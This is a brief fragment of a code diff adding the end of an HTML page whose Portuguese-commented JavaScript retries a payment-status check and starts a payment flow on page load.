+                console.log('🔄 Tentando novamente em 5 segundos...');
+                setTimeout(() => verificarStatus(token), 2000);
+            }
+        }
+
+        // Iniciar o processo quando a página carregar
+        window.addEventListener('load', iniciarPagamento);
+    </script>
+</body>
+</html>
+
